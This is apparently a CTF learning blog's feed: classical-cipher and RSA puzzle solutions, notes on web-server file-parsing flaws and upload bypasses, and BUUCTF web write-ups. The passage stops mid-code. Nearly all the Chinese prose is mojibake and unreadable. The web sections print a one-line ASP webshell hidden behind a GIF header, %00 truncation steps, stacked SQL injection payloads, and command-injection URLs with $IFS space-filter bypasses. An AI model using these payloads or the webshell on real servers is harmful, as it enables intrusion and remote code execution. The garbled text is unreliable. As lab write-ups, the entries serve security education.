title="ÂáØÊííÔºüÊõøÊç¢ÔºüÂëµÂëµ!"></a>ÂáØÊííÔºüÊõøÊç¢ÔºüÂëµÂëµ!</h2><p><strong>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</strong> Ê≥®ÊÑèÔºöÂæóÂà∞ÁöÑ flag ËØ∑ÂåÖ‰∏ä flag{} Êèê‰∫§, flag{Â∞èÂÜôÂ≠óÊØç}<br>MTHJÊòéÊòæÂØπÂ∫îflagÔºå<a href="https://quipqiup.com/">quipqiup-cryptoquipÂíåËß£ÂØÜ</a><br><img src="https://img-blog.csdnimg.cn/b4fc789dba9a46a3a8ba4f652d38fa30.png" alt="1"><br>ÂæóÂà∞ÊòéÊñáËΩ¨Êç¢‰∏∫Â∞èÂÜôÂéªÊéâÁ©∫Ê†ºÂ∞±Ë°å‰∫Ü</p><h2 id="ËêåËêåÂìíÁöÑÂÖ´Êàí-Áå™ÂúàÂØÜÁ†Å"><a href="#ËêåËêåÂìíÁöÑÂÖ´Êàí-Áå™ÂúàÂØÜÁ†Å" class="headerlink" title="ËêåËêåÂìíÁöÑÂÖ´Êàí  (Áå™ÂúàÂØÜÁ†Å)"></a>ËêåËêåÂìíÁöÑÂÖ´Êàí  (Áå™ÂúàÂØÜÁ†Å)</h2><p><img src="https://img-blog.csdnimg.cn/02203a19c57a41a38b98cea954fd1819.png" alt="1"><br>Áå™ÂúàÂØÜÁ†Å<a href="http://www.metools.info/code/c90.html">Ëß£ÂØÜ</a><br><img src="https://img-blog.csdnimg.cn/0a53834bfbea4db2a0476a2124c505ea.png" alt="1"></p><h2 id="‰º†ÁªüÁü•ËØÜ-Âè§ÂÖ∏ÂØÜÁ†Å"><a href="#‰º†ÁªüÁü•ËØÜ-Âè§ÂÖ∏ÂØÜÁ†Å" class="headerlink" title="‰º†ÁªüÁü•ËØÜ+Âè§ÂÖ∏ÂØÜÁ†Å"></a>‰º†ÁªüÁü•ËØÜ+Âè§ÂÖ∏ÂØÜÁ†Å</h2><blockquote><p>Â∞èÊòéÊüê‰∏ÄÂ§©Êî∂Âà∞‰∏ÄÂ∞ÅÂØÜ‰ø°Ôºå‰ø°‰∏≠ÂÜô‰∫ÜÂá†‰∏™‰∏çÂêåÁöÑÂπ¥‰ªΩ<br>       <strong>ËæõÂçØ</strong>Ôºå<strong>Áô∏Â∑≥</strong>Ôºå<strong>‰∏ôÊàå</strong>Ôºå<strong>ËæõÊú™</strong>Ôºå<strong>Â∫öËæ∞</strong>Ôºå<strong>Áô∏ÈÖâ</strong>Ôºå<strong>Â∑±ÂçØ</strong>Ôºå<strong>Áô∏Â∑≥</strong>„ÄÇ<br>       ‰ø°ÁöÑËÉåÈù¢ËøòÂÜôÊúâ‚Äú+<strong>Áî≤Â≠ê</strong>‚ÄùÔºåËØ∑Ëß£Âá∫ËøôÊÆµÂØÜÊñá„ÄÇ</p><p>keyÂÄºÔºöCTF{XXX}</p></blockquote><h3 id="ÂÖ≠ÂçÅÂπ¥Áî≤Â≠êÔºàÂπ≤ÊîØË°®Ôºâ"><a href="#ÂÖ≠ÂçÅÂπ¥Áî≤Â≠êÔºàÂπ≤ÊîØË°®Ôºâ" class="headerlink" title="ÂÖ≠ÂçÅÂπ¥Áî≤Â≠êÔºàÂπ≤ÊîØË°®Ôºâ"></a>ÂÖ≠ÂçÅÂπ¥Áî≤Â≠êÔºàÂπ≤ÊîØË°®Ôºâ</h3><p><img src="https://img-blog.csdnimg.cn/f5fd3210364043a487187ee5536630fd.png" alt="1"><strong>‰∏ÄÁî≤Â≠ê‰∏∫60Âπ¥</strong></p><p>ËæõÂçØÔºåÈ°∫Â∫è‰∏∫Á¨¨28‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 88 ‚Äì&gt; X<br>Áô∏Â∑≥ÔºåÈ°∫Â∫è‰∏∫Á¨¨30‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 90 ‚Äì&gt; Z<br>‰∏ôÊàåÔºåÈ°∫Â∫è‰∏∫Á¨¨23‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 93 ‚Äì&gt; S<br>ËæõÊú™ÔºåÈ°∫Â∫è‰∏∫Á¨¨8‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 68 ‚Äì&gt; D<br>Â∫öËæ∞ÔºåÈ°∫Â∫è‰∏∫Á¨¨17‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 77 ‚Äì&gt; M<br>Áô∏ÈÖâÔºåÈ°∫Â∫è‰∏∫Á¨¨10‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 70 ‚Äì&gt; F<br>Â∑±ÂçØÔºåÈ°∫Â∫è‰∏∫Á¨¨16‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 76 ‚Äì&gt; L<br>Áô∏Â∑≥ÔºåÈ°∫Â∫è‰∏∫Á¨¨30‰∏™ + Áî≤Â≠ê(60) ‚Äì&gt; 90 ‚Äì&gt; Z</p><p><strong>XZSDMFLZ</strong><br>Áúã‰∫Ü‰∏ãwriteupÔºö<br>ÂÖàÊ†ÖÊ†èÔºåÂêéÂáØÊííÔºö</p><blockquote><p>Ê†ÖÊ†èfenceËß£Á†Å:<br>Âõ†Êï∞[2, 4]:<br>ÂàÜ‰∏∫2Ê†èÊó∂ÔºåËß£ÂØÜÁªìÊûú‰∏∫ÔºöXMZFSLDZ<br>ÂàÜ‰∏∫4Ê†èÊó∂ÔºåËß£ÂØÜÁªìÊûú‰∏∫ÔºöXSMLZDFZ</p></blockquote><p>ÁÑ∂ÂêéÂàÜÂà´Ëß£ÂØÜ<br>ÂáØÊííCaesarËß£Á†Å:<br>key #0: XMZFSLDZ<br>key #1: WLYERKCY<br>key #2: VKXDQJBX<br>key #3: UJWCPIAW<br>key #4: TIVBOHZV<br>key #5: <strong>SHUANGYU</strong><br>key #6: RGTZMFXT<br>key #7: QFSYLEWS<br>key #8: PERXKDVR<br>key #9: ODQWJCUQ<br>key #10: NCPVIBTP<br>key #11: MBOUHASO<br>key #12: LANTGZRN<br>key #13: KZMSFYQM<br>key #14: JYLREXPL<br>key #15: IXKQDWOK<br>key #16: HWJPCVNJ<br>key #17: GVIOBUMI<br>key #18: FUHNATLH<br>key #19: ETGMZSKG<br>key #20: DSFLYRJF<br>key #21: CREKXQIE<br>key #22: BQDJWPHD<br>key #23: APCIVOGC<br>key #24: ZOBHUNFB<br>key #25: YNAGTMEA</p><p>ÂáØÊííCaesarËß£Á†Å:<br>key #0: XSMLZDFZ<br>key #1: WRLKYCEY<br>key #2: VQKJXBDX<br>key #3: UPJIWACW<br>key #4: TOIHVZBV<br>key #5: SNHGUYAU<br>key #6: RMGFTXZT<br>key #7: QLFESWYS<br>key #8: PKEDRVXR<br>key #9: OJDCQUWQ<br>key #10: NICBPTVP<br>key #11: MHBAOSUO<br>key #12: LGAZNRTN<br>key #13: KFZYMQSM<br>key #14: JEYXLPRL<br>key #15: IDXWKOQK<br>key #16: HCWVJNPJ<br>key #17: GBVUIMOI<br>key #18: FAUTHLNH<br>key #19: EZTSGKMG<br>key #20: DYSRFJLF<br>key #21: CXRQEIKE<br>key #22: BWQPDHJD<br>key #23: AVPOCGIC<br>key #24: ZUONBFHB<br>key #25: YTNMAEGA</p><p><strong>flag{SHUANGYU}</strong></p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><blockquote><p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p></blockquote><p>ÂÖàÊëÜÂá∫Â∑≤Áü•Êù°‰ª∂Ôºö</p><blockquote><p>c ‚â° m e m o d n c‚â°m^{e} mod n c‚â°memodn m ‚â° c d m o d n m‚â°c^{d} mod n<br>m‚â°cdmodn œï ( n ) &#x3D; ( p ‚àí 1 ) ‚àó ( q ‚àí 1 ) œï(n)&#x3D;(p‚àí1)‚àó(q‚àí1)<br>œï(n)&#x3D;(p‚àí1)‚àó(q‚àí1) d ‚àó e ‚â° 1 m o d œï ( n ) d‚àóe‚â°1 mod œï(n) d‚àóe‚â°1modœï(n) d<br>p ‚â° d m o d ( p ‚àí 1 ) dp‚â°d mod (p‚àí1) dp‚â°dmod(p‚àí1) d q ‚â° d m o d ( q ‚àí<br>1 ) dq‚â°d mod (q‚àí1) dq‚â°dmod(q‚àí1)</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = GCD(a, b) = GCD(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span class="token keyword">def</span> <span class="token function">mod_inv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%</span> b  <span class="token comment"># Ê±ÇaÊ®°bÂæóÈÄÜ</span>p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>invq<span class="token operator">=</span>mod_inv<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>mp<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>mq<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>invq<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞<strong>noxCTF{W31c0m3_70_Ch1n470wn}</strong></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCIIÁ†ÅÂØπÂ∫îË°®</title>
      <link href="/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/"/>
      <url>/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p> <strong>chr(9) tabÁ©∫Ê†º    chr(10) Êç¢Ë°å   chr(13) ÂõûËΩ¶    Chr(13)&amp;chr(10)  ÂõûËΩ¶Êç¢Ë°å    chr(32) Á©∫Ê†ºÁ¨¶    chr(34) ÂèåÂºïÂè∑    chr(39) ÂçïÂºïÂè∑</strong></p><p> <strong>chr(33) !    chr(34) ‚Äú    chr(35) #    chr(36) $    chr(37)  %    chr(38) &amp;    chr(39) ‚Äò    chr(40) (    chr(41)  )    chr(42) *<br> chr(43) +    chr(44) ,    chr(45) -    chr(46) .    chr(47) &#x2F;</strong></p><p> Chr(48) 0    Chr(49) 1    Chr(50) 2    Chr(51) 3     Chr(52) 4    Chr(53) 5    Chr(54) 6    Chr(55) 7     Chr(56) 8    Chr(57) 9</p><p> <strong>chr(58)      chr(59) ;    chr(60) &lt;    chr(61) &#x3D;    chr(62) &gt;    chr(63) ?    chr(64) @</strong></p><p> chr(65) A    chr(66) B    chr(67) C    chr(68) D     chr(69) E    chr(70) F    chr(71) G    chr(72) H      chr(73) I     chr(74) J<br> chr(75) K    chr(76) L     chr(77) M    chr(78) N    chr(79) O    chr(80) P     chr(81) Q    chr(82) R    chr(83) S    chr(84) T<br> chr(85) U    chr(86) V    chr(87) W    chr(88) X    chr(89) Y    chr(90) Z</p><p> <strong>chr(91) [    chr(92) \    chr(93) ]    chr(94) ^    chr(95) _    chr(96) &#96;</strong></p><p> chr(97) a    chr(98) b    chr(99) c    chr(100) d     chr(101) e    chr(102) f    chr(103) g    chr(104) h     chr(105) i<br> chr(106) j    chr(107) k    chr(108) l     chr(109) m    chr(110) n    chr(111) o    chr(112) p     chr(113) q    chr(114) r<br> chr(115) s    chr(116) t     chr(117) u    chr(118) v    chr(119) w    chr(120) x     chr(121) y    chr(122) z</p><p> <strong>chr(123) {    chr(124) |    chr(125) }    chr(126) ~     chr(127)     chr(128)     chr(153)‚Ñ¢    chr(169) ¬©      chr(174)</strong> ¬Æ</p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Êñá‰ª∂Ëß£ÊûêÔºåÊñá‰ª∂Â§¥Ê¨∫È™ó</title>
      <link href="/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/"/>
      <url>/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Êñá‰ª∂Ëß£ÊûêÊºèÊ¥û‚Äî‚Äî"><a href="#Êñá‰ª∂Ëß£ÊûêÊºèÊ¥û‚Äî‚Äî" class="headerlink" title="Êñá‰ª∂Ëß£ÊûêÊºèÊ¥û‚Äî‚Äî"></a>Êñá‰ª∂Ëß£ÊûêÊºèÊ¥û‚Äî‚Äî</h1><p>Ëß£ÊûêÊºèÊ¥û‰∏ªË¶ÅËØ¥ÁöÑÊòØ‰∏Ä‰∫õÁâπÊÆäÊñá‰ª∂Ë¢´iisÔºåapacheÔºånginxÂú®ÊüêÁßçÊÉÖÂÜµ‰∏ãËß£ÈáäÊàêËÑöÊú¨Êñá‰ª∂Ê†ºÂ£´ÁöÑÊºèÊ¥û„ÄÇ</p><h2 id="IisËß£ÊûêÊºèÊ¥û"><a href="#IisËß£ÊûêÊºèÊ¥û" class="headerlink" title="IisËß£ÊûêÊºèÊ¥û"></a>IisËß£ÊûêÊºèÊ¥û</h2><h3 id="1-ÁõÆÂΩïËß£Êûê"><a href="#1-ÁõÆÂΩïËß£Êûê" class="headerlink" title="1.ÁõÆÂΩïËß£Êûê"></a>1.ÁõÆÂΩïËß£Êûê</h3><p>ÂΩìÁΩëÁ´ô‰∏ãÂª∫Á´ãÊñá‰ª∂Â§πÁöÑÂêçÂ≠ó‰∏∫.aspÔºå.asaÁöÑÊñá‰ª∂Â§πÔºåÂÖ∂ÁõÆÂΩïÂÜÖÁöÑ‰ªª‰ΩïÊâ©Â±ïÂêçÁöÑÊñá‰ª∂ÈÉΩË¢´iisÂΩì‰ΩúaspÊñá‰ª∂Êù•Ëß£ÊûêÂπ∂ÊâßË°åÔºåÂ¶ÇÂàõÂª∫ÁõÆÂΩï&#x2F;xxx.asp&#x2F;xx.jpg  xx.jpgË¢´ÂΩì‰ΩúaspÊñá‰ª∂Êù•ÊâßË°åÔºåÂ¶ÇÊûúÈªëÂÆ¢ÂèØ‰ª•ÊéßÂà∂Ê¥ª‰∏ä‰º†Êñá‰ª∂Â§πË∑ØÂæÑÔºåÂ∞±ÂèØ‰ª•‰∏çÁÆ°‰∏ä‰º†ÂêéÁöÑÂõæÁâáÊîπ‰∏çÊîπÂêçÈÉΩËÉΩÊãøshell„ÄÇ</p><h3 id="2-Á¨¶Âè∑ÂêéÈù¢‰∏çË¢´Ëß£Êûê‚Äî‚ÄîÔºàÂèØ‰ΩøÁî®ÊäìÂåÖËΩØ‰ª∂ÊîπÂêéÁºÄÔºâ"><a href="#2-Á¨¶Âè∑ÂêéÈù¢‰∏çË¢´Ëß£Êûê‚Äî‚ÄîÔºàÂèØ‰ΩøÁî®ÊäìÂåÖËΩØ‰ª∂ÊîπÂêéÁºÄÔºâ" class="headerlink" title="2.Á¨¶Âè∑ÂêéÈù¢‰∏çË¢´Ëß£Êûê‚Äî‚ÄîÔºàÂèØ‰ΩøÁî®ÊäìÂåÖËΩØ‰ª∂ÊîπÂêéÁºÄÔºâ"></a>2.Á¨¶Âè∑ÂêéÈù¢‰∏çË¢´Ëß£Êûê‚Äî‚ÄîÔºàÂèØ‰ΩøÁî®ÊäìÂåÖËΩØ‰ª∂ÊîπÂêéÁºÄÔºâ</h3><p>Âú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂàÜÂè∑ÂêéÈù¢ÁöÑ‰∏çË¢´Ëß£ÊûêÔºå‰πüÂ∞±ÊòØËØ¥xxx.asp;.jpg‰ºöË¢´ÊúçÂä°Âô®ÁúãÊàêÊòØxxx.jpg</p><h2 id="ApacheËß£ÊûêÊºèÊ¥û"><a href="#ApacheËß£ÊûêÊºèÊ¥û" class="headerlink" title="ApacheËß£ÊûêÊºèÊ¥û"></a>ApacheËß£ÊûêÊºèÊ¥û</h2><p>apacheÊòØ‰ªéÂè≥Âà∞Â∑¶ÂºÄÂßãÂà§Êñ≠Ëß£ÊûêÔºåÂ¶ÇÊûú‰∏∫‰∏çÂèØËØÜÂà´Ëß£ÊûêÔºåÂ∞±ÂÜçÂæÄÂ∑¶Âà§Êñ≠ÔºåÂ¶Çxxx.php.owf.rar Ôºå‚Äù.owf‚ÄùÂíå‚Äù.rar‚ÄùËøô‰∏§ÁßçÂêéÁºÄÊòØapacheËß£Êûê‰∏ç‰∫ÜÁöÑÔºåapacheÂ∞±‰ºöÊääxxx.php.owf.rarËß£ÊûêÊàêphp.</p><p>ÊÄé‰πàÂéªÂà§Êñ≠ÊòØ‰∏çÊòØÂêàÊ≥ïÁöÑÂêéÁºÄÂ∞±ÊòØËøô‰∏™ÊºèÊ¥ûÂà©Áî®ÂÖ≥ÈîÆÔºåÊµãËØïÊó∂ÊääÂ∏∏ËßÅÁöÑÂêéÁºÄÈÉΩÂÜô‰∏äÔºåÂéªÊµãËØïÊòØ‰∏çÊòØÂêàÊ≥ïÔºå‰ªªÊÑè‰∏çËØÜÂà´ÁöÑÂêéÁºÄÔºåÈÄêÁ∫ßÂêë‰∏äËØÜÂà´</p><h1 id="Êñá‰ª∂Â§¥Ê¨∫È™óÊºèÊ¥û‚Äî‚Äî"><a href="#Êñá‰ª∂Â§¥Ê¨∫È™óÊºèÊ¥û‚Äî‚Äî" class="headerlink" title="Êñá‰ª∂Â§¥Ê¨∫È™óÊºèÊ¥û‚Äî‚Äî"></a>Êñá‰ª∂Â§¥Ê¨∫È™óÊºèÊ¥û‚Äî‚Äî</h1><p>Âú®‰∏ÄÂè•ËØùÊú®È©¨ÂÜÖÂÆπÂâçÈù¢Âä†ÂÖ•gif89aÔºåÂ¶ÇÔºögif89a &lt;%eval request(‚Äúxx‚Äù)%&gt; ÁÑ∂ÂêéÂ∞ÜÊú®È©¨‰øùÂ≠ò‰∏∫ÂõæÁâáÁöÑÊ†ºÂºèÔºåÂ¶Çxxx.jpgÔºåxx.gifÊñá‰ª∂Â§¥Ê¨∫È™óÂèØ‰ª•Áî®Êù•ÁªïËøáÁÆÄÂçïÁöÑwaf„ÄÇ</p><p> <img src="https://img-blog.csdnimg.cn/bf55298bd8f14a2d8b8d9b9813ce976b.png" alt="5"></p><h2 id="00Êà™Êñ≠‚Äî‚Äî"><a href="#00Êà™Êñ≠‚Äî‚Äî" class="headerlink" title="00Êà™Êñ≠‚Äî‚Äî"></a>00Êà™Êñ≠‚Äî‚Äî</h2><p>ÊâæÂà∞‰∏ä‰º†ÊºèÊ¥ûÂêéÔºåÊâìÂºÄÈÄâÊã©‰∏ä‰º†ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨ÔºåÊâìÂºÄÊäìÂåÖËΩØ‰ª∂ÔºåËøõË°å00Êà™Êñ≠ÔºåÊääÊäìÂà∞ÁöÑÊï∞ÊçÆÂåÖÊîπ‰∏∫%00</p><p><img src="https://img-blog.csdnimg.cn/7a82003694db4edcb8fbde4e1e0f3aa8.png" alt="1"></p><p>ÈÄâÂèñ%00</p><p><img src="https://img-blog.csdnimg.cn/e8560e2da51d4cb28d0118f8137af159.png" alt="2"></p><p>ÂèòÊàê16ËøõÂà∂</p><p> <img src="https://img-blog.csdnimg.cn/0e98b39607174575864baa6e3fb4cda2.png" alt="3"></p><p>ÊîæÂåÖ</p><p><img src="https://img-blog.csdnimg.cn/2cda82f915804842b99f150d56196ea0.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-webÈÉ®ÂàÜÂÅöÈ¢òËÆ∞ÂΩï</title>
      <link href="/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL  1"></a>[SUCTF 2019]EasySQL  1</h2><p><img src="https://img-blog.csdnimg.cn/b565bb2a9657430992b91bbc44e7da14.png" alt="1"><br>‰º†ÂÖ•Êï∞Â≠óÊúâÂõûÊòæ,Â≠óÊØçÊó†ÂõûÊòæ</p><p><img src="https://img-blog.csdnimg.cn/f43f0672d814487e8e3ba485eec10a71.png" alt="2"><br>‰º†ÂÖ•1‚ÄôÊó†ÂõûÊòæ<br>‰º†ÂÖ•1‚Äô or ‚Äò1‚Äô&#x3D;‚Äô1ÊúâÊñ∞ÁöÑÂõûÊòæ<br><img src="https://img-blog.csdnimg.cn/3192b758fcd640a7be33dc8f451997b2.png" alt="3"><br>ÂèØËÉΩÂ≠òÂú®Ê≥®ÂÖ•ÁÇπ<br>‰ΩøÁî®<code>1&#39; order by 4#</code>ÁúãÁúãÊúâÂ§öÂ∞ëÂàóÔºåËØï‰∫ÜÂæàÂ§öÊ¨°ÈÉΩ‰∏çË°å„ÄÇËØïËØïÂ†ÜÂè†Ê≥®ÂÖ•<br><code>1;show databases;#</code><br><img src="https://img-blog.csdnimg.cn/d736ee3c4872469e8becd01db21751f6.png" alt="4"><br><code>1;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/8948218749ff428986d236abc8a79a21.png" alt="5"><br>ÂêéÈù¢Â∞±Ëøõ‰∏çÂéª‰∫ÜÔºåÂèÇËÄÉ‰∫ÜÂ∏àÂÇÖ‰ª¨ÁöÑWPÔºå</p><blockquote><p>select $post[‚Äòquery‚Äô]||flag from Flag </p></blockquote><p>ËøôÊòØÂÖ≥ÈîÆËØ≠Âè•ÔºÅ<br>ÂΩì sql_mode ËÆæÁΩÆ‰∫Ü PIPES_AS_CONCAT Êó∂Ôºå|| Â∞±ÊòØÂ≠óÁ¨¶‰∏≤ËøûÊé•Á¨¶ÔºåÁõ∏ÂΩì‰∫éCONCAT() ÂáΩÊï∞<br>ÂΩì sql_mode Ê≤°ÊúâËÆæÁΩÆ PIPES_AS_CONCAT Êó∂ ÔºàÈªòËÆ§Ê≤°ÊúâËÆæÁΩÆÔºâÔºå|| Â∞±ÊòØÈÄªËæëÊàñÔºåÁõ∏ÂΩì‰∫éORÂáΩÊï∞<br>ÊâÄ‰ª•Ë¶ÅÊÉ≥ÂäûÊ≥ïËÆ© || ‰∏çÊòØÈÄªËæëÊàñÔºå‰øÆÊîπsql_mode‰∏∫PIPES_AS_CONCATÔºåÁÑ∂ÂêéÂÜçÊ¨°Êü•ËØ¢</p><p><strong>Ëß£Ê≥ï‰∏Ä</strong></p><blockquote><p>1;set sql_mode&#x3D;pipes_as_concat;select 1</p></blockquote><p>‰ΩøÁî®<code>set sql_mode=PIPES_AS_CONCAT;</code>Â∞Ü||ËßÜ‰∏∫Â≠óÁ¨¶‰∏≤ÁöÑËøûÊé•Êìç‰ΩúÁ¨¶ËÄåÈùûÊàñËøêÁÆóÁ¨¶„ÄÇ<br><img src="https://img-blog.csdnimg.cn/dadc8d4a66bf4ab7af9377443c126787.png" alt="6"><br><strong>Ëß£Ê≥ï‰∫å</strong></p><blockquote><p>*,1</p></blockquote><h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p>‰∏ªË¶ÅËÄÉÊü•<strong>ÂëΩ‰ª§ÊâßË°å</strong></p><p>ËÆ©Êàë‰ª¨get‰º†ÂÖ•‰∏Ä‰∏™IP<br><img src="https://img-blog.csdnimg.cn/569938c8fcdb447886240ed7bbfec003.png" alt="1"><br>ÈÇ£‰º†‰∏Ä‰∏™IPÂú∞ÂùÄÁúãÁúã‰ºöÂèëÁîü‰ªÄ‰πàÔºö<br><img src="https://img-blog.csdnimg.cn/983781f716ab4dd0aa80bfe544eba0ce.png" alt="2"><br>ÂêéÈù¢ÊãºÊé•‰∏Ä‰∏™ÁúãÁúãÔºö<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;ls</code><br><img src="https://img-blog.csdnimg.cn/d5cf920fe0bf4f6ea4a7cc2fec2ce939.png" alt="3"><br>‰∏çÈîôÊ¨∏ÔºåÁªßÁª≠<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat flag.php</code><br><img src="https://img-blog.csdnimg.cn/560f292fac52458eb954a92f641c625b.png" alt="4"><br>ËøáÊª§‰∫ÜÁ©∫Ê†º„ÄÇÁ©∫Ê†ºÁöÑ‰ª£ÊõøÊúâ<code>$IFSÔºå$&#123;IFS&#125;Ôºå$IFS$9Ôºå&lt;Ôºå&lt;&gt;Ôºå%09Ôºå%0a</code>Á≠âÔºåÊúÄÂêé<code>$IFS$9</code>ËÉΩÁî®„ÄÇ<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9flag.php</code><br>flagÂèàË¢´ËøáÊª§‰∫Ü<br><img src="https://img-blog.csdnimg.cn/6b6bd7f364e64dc1add617a96fb8be44.png" alt="5"><br>Âà∞Â∫ïÈÉΩÊòØËøáÊª§‰∫Ü‰ªÄ‰πàÔºüÂà∞index.phpÁúãÁúãÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span 